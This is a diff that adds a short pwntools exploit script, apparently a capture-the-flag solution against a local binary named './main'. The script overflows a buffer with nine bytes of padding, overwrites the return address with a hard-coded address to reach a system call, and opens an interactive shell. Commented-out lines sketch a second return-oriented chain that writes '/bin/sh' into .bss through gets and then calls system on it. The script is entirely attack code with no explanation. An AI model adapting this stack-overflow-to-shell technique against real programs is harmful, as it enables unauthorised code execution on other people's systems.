@@ -1,0 +1,19 @@
+from pwn import *
+p=process('./main')
+#gdb.attach(p)
+system1_add=0x40117e
+'''
+system_add=0x401040
+bss=0x404049
+gets_plt=0x401060
+main_add=0x401152
+'''
+payload='a'*(0x1+0x8)+p64(system1_add)
+'''
+payload1='a'*(0x1+0x8)+p64(gets_plt)+p64(main_add)+p64(bss)
+p.sendline(payload1)
+p.sendline("/bin/sh\00")
+payload2='a'*(0x1+0x8)+p64(system_add)+'aaaa'+p64(bss)
+'''
+p.sendline(payload)
+p.interactive()
